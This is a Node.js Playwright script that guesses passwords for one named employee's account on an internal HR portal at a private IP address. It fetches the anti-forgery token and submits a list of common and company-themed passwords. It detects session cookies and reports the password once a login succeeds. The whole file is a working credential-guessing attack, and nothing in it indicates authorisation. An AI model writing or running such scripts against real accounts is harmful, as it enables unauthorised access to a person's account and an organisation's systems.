// Try different passwords for rino.prasetyo
const { chromium } = require('C:/Users/Administrator/AppData/Roaming/npm/node_modules/playwright');

const BASE_URL = 'http://10.55.3.3/KPB-PortalHC';
const PASSWORDS = ['123456', 'Pertamina@2026', 'Balikpapan@2026', 'rino123', 'Rino@2026', 'password', 'Password123', 'Pertamina123'];

async function tryLogin(ctx, email, password) {
  const page = await ctx.newPage();
  try {
    await page.goto(`${BASE_URL}/Account/Login`, { waitUntil: 'domcontentloaded', timeout: 60000 });
    await page.waitForTimeout(4000);

    const token = await page.evaluate(() => {
      const inp = document.querySelector('input[name="__RequestVerificationToken"]');
      return inp ? inp.value : null;
    });

    const loginResult = await page.evaluate(async ({ baseUrl, email, pass, tok }) => {
      const formData = new URLSearchParams();
      formData.append('email', email);
      formData.append('password', pass);
      formData.append('__RequestVerificationToken', tok);

      const resp = await fetch(`${baseUrl}/Account/Login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData.toString(),
        redirect: 'follow',
        credentials: 'include'
      });
      return { status: resp.status, url: resp.url };
    }, { baseUrl: BASE_URL, email, pass: password, tok: token });

    const cookies = await ctx.cookies();
    const hasSession = cookies.some(c => c.name.includes('Identity') || c.name.includes('Session') || c.name.includes('auth'));
    const success = !loginResult.url.includes('/Account/Login');
    console.log(`  ${password}: fetch result url=${loginResult.url.substring(0,50)}, success=${success}, sessionCookie=${hasSession}`);
    await page.close();
    return success;
  } catch(e) {
    console.log(`  ${password}: ERROR ${e.message.split('\n')[0]}`);
    await page.close();
    return false;
  }
}

async function main() {
  const browser = await chromium.launch({ headless: true });

  for (const pass of PASSWORDS) {
    const ctx = await browser.newContext();
    const ok = await tryLogin(ctx, 'rino.prasetyo@pertamina.com', pass);
    await ctx.close();
    if (ok) { console.log(`FOUND: rino password = ${pass}`); break; }
  }

  await browser.close();
}

main().catch(e => console.error(e));
